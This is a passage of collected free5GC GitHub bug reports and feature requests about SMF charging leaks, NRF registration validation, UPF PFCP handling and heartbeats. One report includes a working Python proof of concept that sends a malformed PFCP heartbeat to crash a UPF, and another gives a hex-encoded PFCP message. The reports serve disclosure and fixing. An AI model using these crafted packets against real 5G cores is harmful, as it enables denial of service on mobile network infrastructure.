- The SMContext is also not removed on this branch, and — crucially — it becomes immediately unreachable **within the same request**: `LocalRelease` is invoked from the create handler for a duplicate key (pdu_session.go:73-75, main 91-93), and the very next line, `NewSMContext` (pdu_session.go:78, main :96), overwrites `canonicalRef` with the new context. On the failed branch the old SMContext is therefore no longer findable by SUPI / PDU Session ID, while it stays held in `smContextPool` and `seidSMContextMap` as a zombie, so no SMF procedure can reach it by SUPI / PDU Session ID. The only remaining path is a UPF association release (`releaseAllResourcesOfUPF`, association.go:163, main :279), which ranges `smContextPool` and may remove the context via `RemoveSMContextFromAllNF` — but that function sends no `CHARGING_RELEASE`, so the charging session stays open on the CHF either way. If the UPF stays associated (e.g. it rejected the N4 deletion rather than going unreachable), the zombie SMContext itself also persists.
- **Accumulation:** the charging session leaks on the CHF once per failed local release (slope 1), regardless of whether the zombie SMContext is later swept; bounded at 1 only when the exact same session is retried.

## Expected Behavior

The `SessionReleaseFailed` (and default) branch of `HandlePDUSessionSMContextLocalRelease` does **not** call `RemoveSMContextFromAllNF`, so it must handle cleanup itself: on that branch the SMF should release the charging session (and finish removing the now-unreachable SMContext) before it stops, so a failed PFCP deletion does not leave a charging session open on the CHF together with a zombie SMContext.

(Adding a charging release inside `RemoveSMContextFromAllNF` when `smContext.ChargingDataRef != ""` is a separate, complementary fix — it covers the paths that *do* call `RemoveSMContextFromAllNF`, i.e. the `SessionReleaseFailed` branch of the **`HandlePDUSessionSMContextRelease`** handler. It does **not** fix this LocalRelease bug on its own, because this branch never reaches that function.)

## Screenshots

N/A

## Environment

- free5GC Version: SMF v1.4.3 (`2232d299`); reproduced through the SMF unit-test harness, not a full deployment
- OS: Ubuntu 24.04.5 LTS
- Kernel version: 6.8.0-139-generic
- go version: go1.25.5 linux/amd64

## Trace Files / Configuration Files

N/A. The PoC runs under `pdu_session_test.go` with gock-stubbed NRF/UDM/PCF/CHF and a stub PFCP; the PFCP failure is produced by the env-gated `POC_FORCE_RELEASE_FAILED` described above.

## PCAP File

N/A. This is a code-logic issue, unrelated to the packet level.

## Log File

```
[INFO][SMF][Charging] Send Charging Data Request[Init] successfully
[INFO][SMF][PduSess] In HandlePDUSessionSMContextLocalRelease
[TRAC][SMF][CTX] In case SessionReleaseFailed
```
The init is sent; the local release takes the `SessionReleaseFailed` branch; no charging release is logged, and no SMContext removal is logged on this branch.

## System Architecture (Optional)

Single-process Go test harness. NRF/UDM/PCF/CHF are gock HTTP stubs and PFCP is a stub; there is no real UPF and no AMF.

## Additional Context

This is a different bug from the create-time charging leak (e.g. an `ApplySessionRules` failure): there, the full cleanup runs and only the charging release is missing. Here, on `SessionReleaseFailed` the handler does not even run the cleanup — it reverts the state and returns — so both the SMContext and its charging session are left live. The sibling handler `HandlePDUSessionSMContextRelease` (AMF-initiated release) has the same charging gap on its failed branch, but there the SMContext *is* removed, so only the CHF-side charging session is orphaned.

**Anticipated objection.** One might argue that if the PFCP deletion failed the UPF session is still live, so keeping the charging session open is correct. That does not hold here. Because the old SMContext is overwritten in the same create request (above), no SMF procedure can reach it by SUPI / PDU Session ID to retry the release. The one path that can still sweep it is a UPF association release (`releaseAllResourcesOfUPF`), which — in the "UPF unreachable" case — likely runs after a heartbeat failure and removes the context via `RemoveSMContextFromAllNF`; but that function sends no `CHARGING_RELEASE`, so **the charging session stays open on the CHF either way**. Only the zombie SMContext is conditional: it is swept if the association drops, and persists if the UPF stays associated (it merely rejected the N4 deletion). The charging leak is unconditional, which is why the failed branch must release charging itself.

## How did we find?

We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] NRF accepts NF registration without required nfStatus field, causing HTTP 500 on all subsequent PATCH heartbeat requests for that NF instance
items.body: ## Bug Decription This vulnerability leverages a two-stage NNRF-NFM message sequence that exploits a missing input validation in the NF registration handler. By omitting the required `nfStatus` field on a PUT registration, the NF profile is persisted to MongoDB without the `nfStatus` key. Any subsequent standard PATCH heartbeat targeting that NF instance then fails with HTTP 500 because the json-patch `replace` operation requires the path to exist in the document. The error is unrecoverable without restarting free5GC or re-registering the NF instance: - free5GC NRF accepts `PUT /nnrf-nfm/v1/nf-instances/{id}` with `nfStatus` absent despite it being a **required** field in 3GPP TS 29.510 §5.2.2.2. - The MongoDB document is stored **without** the `nfStatus` key. - Every subsequent `PATCH /nnrf-nfm/v1/nf-instances/{id}` with `{"op":"replace","path":"/nfStatus","value":"REGISTERED"}` (the standard 3GPP heartbeat) fails with: ``` [ERRO][NRF][NFM] UpdateNFInstanceProcedure err: RestfulAPIJSONPatch Apply err: missing value replace operation does not apply: doc is missing key: /nfStatus ``` - NRF returns HTTP 500 for every heartbeat attempt on that NF instance until the process is restarted. - Any NF (AMF, SMF, PCF, …) registered in this manner will have its heartbeat permanently broken — NRF will eventually deem the NF UNDISCOVERABLE, breaking service discovery for all NFs that depend on it. ## To Reproduce Steps to reproduce the behavior: Run: python3 nrf_patch_missing_key_sender.py [nrf_patch_missing_key_sender.py](https://github.com/user-attachments/files/26920307/nrf_patch_missing_key_sender.py) ## Expected Behavior - `PUT /nnrf-nfm/v1/nf-instances/{id}` with a missing `nfStatus` field should be rejected immediately with HTTP 400 and a `ProblemDetails` body (`cause: MISSING_NF_STATUS`). The NF profile must not be persisted to MongoDB without all required fields. - If a malformed registration somehow reaches persistence, the PATCH heartbeat handler must check whether the target path exists in the document before applying the json-patch operation, and return a structured 4xx error rather than an internal 500. - A single malformed PUT registration must not be able to permanently disable heartbeat processing for that NF instance. ## Screenshots ## Environment **Please, complete the following information:** free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files nrf: configuration: MongoDBName: free5gc # database name in MongoDB MongoDBUrl: mongodb://127.0.0.1:27017 # bindingIPv4: 127.0.0.10 # IP used to bind the service port: 8000 # port used to bind the service cert: # the local path of TLS key pem: cert/nrf.pem # NRF TLS Certificate key: cert/nrf.key # NRF TLS Private key rootcert: # the local path of root CA certs pem: cert/root.pem key: cert/root.key oauth: false DefaultPlmnId: mcc: 208 # Mobile Country Code (3 digits string, digit: 0~9) mnc: 93 # Mobile Network Code (2 or 3 digits string, digit: 0~9) serviceNameList: # the SBI services provided by this NRF, refer to TS 29.510 - nnrf-nfm # Nnrf_NFManagement service - nnrf-disc # Nnrf_NFDiscovery service ### PCAP File [nrf.zip](https://github.com/user-attachments/files/26920370/nrf.zip) ### Log File 2026-04-21T04:59:36.153462395Z [INFO][NRF][NFM] Handle UpdateNFInstanceRequest 2026-04-21T04:59:36.155123791Z [ERRO][NRF][NFM] UpdateNFInstanceProcedure err: RestfulAPIJSONPatch Apply err: missing value github.com/evanphx/json-patch/v5.init :1 runtime.doInit1 items.title: [Bugs] UPF vulnerable to malformed PFCP Session Establishment Request causing denial of service via timer resource leakage
items.body: ## Bug Decription A critical denial-of-service (DoS) vulnerability exists in the UPF's PFCP (Packet Forwarding Control Protocol) handler where a specially crafted Session Establishment Request causes the UPF to leak timer resources that are never cleaned up. The core issue is timer resource leakage: Even when PDR and FAR creation fails (with "invalid argument" errors), the UPF still successfully creates periodic timers for URRs (Usage Reporting Rules), leaving background goroutines and memory allocated indefinitely. The vulnerability demonstrates two attack vectors: 1.Timer resource leakage: Despite PDR and FAR creation failure, UPF creates URR timers that continue running in the background, consuming CPU and memory resources 2.Inconsistent state: UPF enters a half-created state (with URRs but no PDRs/FARs) that prevents normal PFCP message processing A single malicious PFCP message from an attacker can create permanent background timers that accumulate over time, eventually exhausting UPF resources and rendering it unable to process legitimate SMF heartbeat and association requests. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Sending Association Setup Request (30 bytes): 2005001a75b78900003c0005007f00006400600004ed103703005900013f 3. Sending Session Establishment Request (1335 bytes)  ## Expected Behavior The UPF should: Validate input rigorously: Check all PFCP IEs for valid ranges, combinations, and consistency before processing Graceful error handling: Reject malformed messages with appropriate PFCP Cause values (e.g., 73 - Invalid arguments) without entering an inconsistent state Resource protection: Implement resource limits and quotas to prevent exhaustion attacks Isolation and recovery: Isolate the impact of malformed messages and maintain ability to process other requests Timeouts and cleanup: Implement timeouts for message processing and automatic cleanup of partially created sessions Input sanitization: Reject or sanitize invalid values like 0xffffffff for IDs, malformed IP addresses, etc. ## Screenshots ## Environment free5GC Version: v4.0.1 OS: Ubuntu 20.04 Server Kernel version: 6.8.0-47-generic go version: go1.24.5 linux/amd64 ## Trace Files ### Configuration Files pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission peers: - items.title: [Bugs] UPF silently returns Cause=Accepted when UpdateBAR fails — buffering policy changes never applied to gtp5g kernel; companion wrong-ID variant triggers complete UPF hang DoS with no recovery
items.body: ## Bug Decription A SessionModificationRequest containing an UpdateBAR IE referencing a non-existent BAR-ID causes the UPF to log a goroutine stack trace but unconditionally return Cause=RequestAccepted. The BAR update is silently discarded. Additionally, a second, more severe variant exists: when UpdateBAR references a wrong BAR-ID on a session that has an active BAR with a different ID (established with FAR(action=BUFF)+BAR), the UPF goroutine hangs permanently — the UPF stops responding to all PFCP messages including heartbeats, resulting in a complete data-plane DoS with no automatic recovery. Impact Buffering policy bypass: Paging state buffering freeze: During UE paging (IDLE→CONNECTED), the SMF sends UpdateBAR to adjust the DL data notification delay and suggested buffer packet count. Silent failure means the kernel buffer parameters are never updated — packets may be dropped prematurely (zero-delay BAR) or retained indefinitely (max-delay BAR), disrupting paging-triggered data delivery. N9 handover buffering policy divergence: During inter-UPF handover (N9 session), the SMF issues UpdateBAR on the source UPF to drain buffered packets. Silent failure means packets remain buffered on the source UPF after handover, causing duplicate delivery on the target UPF or permanent packet loss. Root Cause session.go line 281: err = sess.UpdateBAR(i) if err != nil { sess.log.Errorf("Mod UpdateBAR error: %+v", err) // error discarded — buffering policy change silently not applied; Cause=Accepted returned } node.go ~line 470: func (s *Sess) UpdateBAR(i *ie.IE) error { id, err := i.BARID() ... if _, ok := s.BARs[id]; !ok { return fmt.Errorf("UpdateBAR: BAR(%#x) not found", id) } // ... } ## To Reproduce Steps to reproduce the behavior: Run: python3 free5gc_upf_update_bar_not_found_repro.py [free5gc_upf_update_bar_not_found_repro.py](https://github.com/user-attachments/files/26703128/free5gc_upf_update_bar_not_found_repro.py) ## Expected Behavior When UpdateBAR fails, the UPF must return Cause=RuleCreationModificationFailure per 3GPP TS 29.244 §7.5.4. The UpdateBAR handler must not block indefinitely on any code path regardless of session state. A not-found BAR-ID must return an error response, not hang the goroutine. The UPF PFCP handler goroutine must be resilient to all valid and malformed inputs. ## Screenshots ## Environment free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission ### PCAP File [free5gc_upf_update_bar_not_found_repro.zip](https://github.com/user-attachments/files/26703204/free5gc_upf_update_bar_not_found_repro.zip) ### Log File 2026-04-14T07:58:22.794242189Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100] New node 2026-04-14T07:58:22.794867268Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionEstablishmentRequest 2026-04-14T07:58:22.794933689Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x8009][UPSEID:0x1] New session 2026-04-14T07:58:22.796963141Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionModificationRequest 2026-04-14T07:58:22.797312305Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x8009][UPSEID:0x1] Mod UpdateBAR error: UpdateBAR: BAR(0x1) not found github.com/free5gc/go-upf/internal/pfcp.(*Sess).UpdateBAR /home/fei/free5gc/NFs/upf/internal/pfcp/node.go:470 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionModificationRequest /home/fei/free5gc/NFs/upf/internal/pfcp/session.go:281 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).reqDispacher /home/fei/free5gc/NFs/upf/internal/pfcp/dispacher.go:23 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main /home/fei/free5gc/NFs/upf/internal/pfcp/pfcp.go:156 runtime.goexit /home/fei/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.25.5.linux-amd64/src/runtime/asm_amd64.s:1693

Hi,

I am working with free5GC using two UPFs currently. The problem I am describing now is kind of vague at the moment, and I hope to investigate it further with your help.

When a UPF fails, the association thread detects this failure through the heartbeat. The UPF then is re-associated.

## Describe the bug
The problem I encounter very frequently is that this re-association actually never happens. I can see the SMF sends the association requests to the UPF, and I can also see the UPF correctly processes them. Yet, the reply is never processed by the SMF. Instead, the SMF fails with the error "Request Transaction [14439]: retry-out after 3 attempt(s)".

This happens even without any UE or RAN connected (I use ueransim). I think it is important to mention that I use a heartbeat interval of 10ms for my tests (with 0 retries and a 10ms timeout, I parametrized [these values](https://github.com/free5gc/pfcp/blob/main/transaction.go#L46)), as I depend on detecting failures fast. 

I do not know yet what causes this issue, but I think it may be connected to the custom PFCP library using by the SMF and UPF. 

## To Reproduce
Steps to reproduce the behavior:
1. Use latest free5GC v3.3.0.
1. Use standard configuration, insert both UPFs into SMF config.
1. Configure the heartbeat interval to 10ms and change the PFCP retry to 0 and the timeout to 10ms [here](https://github.com/free5gc/pfcp/blob/main/transaction.go#L46). Recompile the SMF with these new values. Or parametrize them and read them from a config file.
1. Start free5GC with two UPFs (I use OpenvSwitch and Linux network namespaces to run both on the same VM).

This is the hard part now, as the problem does not show up always. This is why I suspect it is a race condition or high load related problem. Essentially, wait until one heartbeat failure is falsely detected (on my system, a 10ms heartbeat leads to many false-positive heartbeat misses). ## Expected behavior
The association should be successful.

items.body:
## Describe the bug
While testing the free5gc UPF for some PFCP basic and security features, I could trigger several crashes when it receives special kind of PFCP messages (the secondary IE type is larger than 0x7fff). This could cause DOS of any UPF instance, all memory issues due to this kind of PFCP messages are caught by the GO memory runtime, which would casue a panic and crash.

## To Reproduce
Steps to reproduce the behavior:
1. Build the UPF with source code
2. Run the bin/upf with default config/upfcfg.yaml
3. Run the following POC python script


```python
#!/usr/bin/env python3

import socket

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.settimeout(1.0)

pfcp_association_setup_request = b'\x20\x05\x00\x1f\x00\x00\x01\x00\x00\x3c\x00\x05\x00\x0a\x64\xc8\x64\x00\x60\x00\x04\xe8\x1f\xdc\x30\x00\x2b\x00\x06\x21\x00\x00\x00\x00\x00'

"""
 PFCP Heartbeat Request with a second IE whose type is 0xffff (larger than 0x7fff)
"""
pfcp_heartbeat_request = b'\x20\x01\x00\x0f\x00\x00\x00\xff\xff\xff\x00\x00\x60\x00\x04\xe8\x1f\xdc\x30'

udp_socket.sendto(pfcp_association_setup_request, ('127.0.0.8', 8805))
try:
   udp_socket.recv(65535)
except Exception as exception:
   print(f"Receive failed: {exception}")

udp_socket.sendto(pfcp_heartbeat_request, ('127.0.0.8', 8805))
try:
   udp_socket.recv(65535)
except Exception as exception:
   print(f"Receive failed: {exception}")

udp_socket.close()
```

Any people could leverage this to cause DOS and resource consumption against a pool of UPF. As much as possible, check this kind of PFCP messages whose second IE type is larger than 0x7ffff, update handling logic or just drop them to avoid frequent crashes. items.title: [Feat] PFCP Heartbeat Procedure
items.body:
## Issue Description

Even if a UPF fails and cannnot communicate with SMF, SMF sends a new PFCP session related request to the failed UPF.  And SMF has no way to know when the UPF recovers.

### What's the version are you using
v3.2.1 + latest main

### Is your feature request related to a problem? Please describe.

SMF monitors UPFs by PFCP Heartbeat Procedure (TS 29.244 6.2).  
If SMF detects a UPF failure in the procedure, SMF doesn't send new PFCP session related request to the UPF until it is recovered.

### Describe the solution you'd like

After PFCP association has been established, SMF sends PFCP Heartbeat Request to the UPFs at regular intervals.   
The interval is new item in SMF configuration.
```
  pfcp:
    heartbeat: # the heartbeat related (optional)
      interval: 10s # default is 0s (if interval is 0s, heartbeat procedure is disabled)
```

If SMF receives PFCP Heartbeat Response from a UPF, SMF saves Recovery Time Stamp (T1) in the response when the first response is received. For the second or subsequent response, SMF compares the received Recovery Time Stamp (T2) with T1.  
If T1 < T2, it means the UPF has restarted. SMF deletes PFCP Association and releases all PDU sessions associated with the UPF and trys to re-establish PFCP Association.  
If SMF did not receive PFCP Heartbeat Response from a UPF, SMF takes the same action when T1 < T2.

Pull Requests for the feature.
* [smf](https://github.com/free5gc/smf/pull/63)
* [pfcp](https://github.com/free5gc/pfcp/pull/10)

### Describe alternatives/workarounds you've considered

None

### Additional context

None
